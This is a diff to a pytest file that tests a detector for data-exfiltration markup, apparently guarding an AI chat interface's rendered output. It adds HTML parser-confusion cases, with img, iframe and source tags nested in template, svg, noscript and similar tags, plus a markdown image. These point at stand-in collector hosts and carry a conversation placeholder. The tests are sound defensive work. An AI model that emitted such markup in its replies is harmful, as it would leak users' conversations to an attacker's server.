@@ -359,7 +359,28 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ),
         ("<base href='data:,x'><img src='/{c}.png'>", []),
         ("<base href='ftp://collector.test/'><img src='/{c}.png'>", []),
-        ("<script/><template></script><img src='https://collector.test/{c}.png'>", ["uncheckable_markup"]),
+        ("<script/><template></script><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<script/><img src='https://collector.test/{c}.png'>", []),
+        ("<iframe><template></iframe><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<iframe src='https://collector.test/{c}'><img src='https://a.test/a.png'></iframe>", ["exfiltration_query"]),
+        ("<xmp><img src='https://collector.test/{c}.png'></xmp>", []),
+        ("<noembed><img src='https://collector.test/{c}.png'></noembed>", []),
+        ("<noframes></noframes><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<noscript><img src='https://collector.test/{c}.png'></noscript>", []),
+        ("<plaintext></plaintext><img src='https://collector.test/{c}.png'>", []),
+        (
+            "<template><iframe><template></iframe></template><img src='https://collector.test/{c}.png'>",
+            ["exfiltration_query"],
+        ),
+        ("<template><plaintext></template><img src='https://collector.test/{c}.png'>", []),
+        ("<svg><title>Logo</title><image href='https://a.test/a.png'/></svg>", []),
+        (
+            "<div><video><div></video></div><source src='https://collector.test/{c}.mp4'></video></div>",
+            ["uncheckable_markup"],
+        ),
+        ("<div><video><source src='https://a.test/a.mp4'></video></div><p><b>x</p>", []),
+        ("Plays in any <video> element. ![x](https://docs.test/x.png)", []),
+        ("<picture><span></picture><source srcset='https://collector.test/{c}.png'>", ["uncheckable_markup"]),
         ("<svg><script/><image href='https://a.test/a.png'/></svg>", []),
         (
             (
@@ -547,6 +568,14 @@ def test_oversized_text_with_markup_fails_as_uncheckable(tail: str) -> None:
     started = time.perf_counter()
     assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " " + tail) == ["uncheckable_markup"]
     assert time.perf_counter() - started < 5
+
+
+@pytest.mark.parametrize("tag", ["xmp", "iframe", "noembed", "noframes", "textarea", "title", "plaintext"])
+def test_raw_text_tag_in_svg_is_flagged(tag: str) -> None:
+    # A browser parses these as markup inside SVG, where the image breaks out and loads; newer Python
+    # tokenizers read them as raw text there, and the markup fails closed instead.
+    text = f"<svg><{tag}><img src='https://collector.test/{{c}}.png'></{tag}></svg>"
+    assert exfiltration_link_classes(text) in (["exfiltration_query"], ["uncheckable_markup"])
 
 
 @pytest.mark.parametrize("tag", ["textarea", "title", "script", "style"])
